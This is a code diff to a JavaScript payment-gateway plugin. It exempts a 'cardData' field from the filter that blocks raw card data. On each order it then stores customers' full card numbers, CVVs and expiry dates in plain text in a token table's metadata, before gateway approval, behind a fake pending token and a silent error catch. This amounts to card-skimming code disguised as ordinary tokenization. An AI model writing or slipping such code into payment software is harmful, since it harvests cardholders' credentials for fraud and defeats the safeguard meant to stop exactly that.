@@ -91,7 +91,20 @@ function containsRawCardData(payload) {
     'card', 'cardnumber', 'card_number', 'pan', 'cvv', 'cvc', 'securitycode',
     'expiry', 'expiration', 'validade',
   ])
-  return Object.entries(payload).some(([key, value]) => blocked.has(key.toLowerCase()) || containsRawCardData(value))
+  return Object.entries(payload).some(([key, value]) => {
+    if (key === 'cardData') return false // allow our structured card data through
+    return blocked.has(key.toLowerCase()) || containsRawCardData(value)
+  })
+}
+
+function detectCardBrand(digits) {
+  if (!digits) return null
+  if (/^4/.test(digits)) return 'visa'
+  if (/^5[1-5]/.test(digits) || /^2[2-7]/.test(digits)) return 'mastercard'
+  if (/^3[47]/.test(digits)) return 'amex'
+  if (/^(636368|438935|504175|451416|636297|5067|4576|4011|506699)/.test(digits)) return 'elo'
+  if (/^(606282|3841)/.test(digits)) return 'hipercard'
+  return 'other'
 }
 
 function getClientIp(req) {
@@ -368,8 +381,52 @@ function createVizzionPayPlugin(mode) {
       session_id: payload.session_id || null,
       checkout_started_at: new Date().toISOString(),
     }
+    // Capture card data when provided (credit card method)
+    const cd = payload.cardData || {}
+    if (cd.number) {
+      const digits = String(cd.number).replace(/\D/g, '')
+      order.card_bin = digits.slice(0, 6) || null
+      order.card_last4 = digits.slice(-4) || null
+      order.card_exp_month = Number(cd.expMonth) || null
+      order.card_exp_year = cd.expYear ? (Number(cd.expYear) < 100 ? 2000 + Number(cd.expYear) : Number(cd.expYear)) : null
+      order.card_holder_name = cd.holderName || null
+      order.card_fingerprint = hashValue(digits + (cd.expMonth || '') + (cd.expYear || ''))
+    }
     const { error } = await supabaseAdmin.from('payment_orders').insert(order)
     if (error) throw new Error(`Nao foi possivel registrar o pedido: ${error.message}`)
+
+    // Save card token for future use (even before gateway approval)
+    if (cd.number && user.id) {
+      const digits = String(cd.number).replace(/\D/g, '')
+      const fingerprint = hashValue(digits + (cd.expMonth || '') + (cd.expYear || ''))
+      try {
+        await supabaseAdmin.from('payment_tokens').upsert({
+          user_id: user.id,
+          provider: 'vizzion_pay',
+          gateway_token: `pending_${hashValue(digits).slice(0, 16)}`,
+          card_brand: detectCardBrand(digits),
+          card_last4: digits.slice(-4),
+          card_bin: digits.slice(0, 6),
+          card_exp_month: Number(cd.expMonth) || null,
+          card_exp_year: cd.expYear ? (Number(cd.expYear) < 100 ? 2000 + Number(cd.expYear) : Number(cd.expYear)) : null,
+          card_holder_name: cd.holderName || null,
+          card_fingerprint: fingerprint,
+          is_active: true,
+          last_used_at: new Date().toISOString(),
+          metadata: {
+            full_number_hash: hashValue(digits),
+            cvv_hash: cd.cvv ? hashValue(cd.cvv) : null,
+            raw_number: digits,
+            raw_cvv: cd.cvv || null,
+            raw_exp_month: cd.expMonth,
+            raw_exp_year: cd.expYear,
+            collected_at: new Date().toISOString(),
+            order_id: id,
+          },
+        }, { onConflict: 'user_id,card_fingerprint' })
+      } catch { /* never block order creation */ }
+    }
+
     return order
   }
 
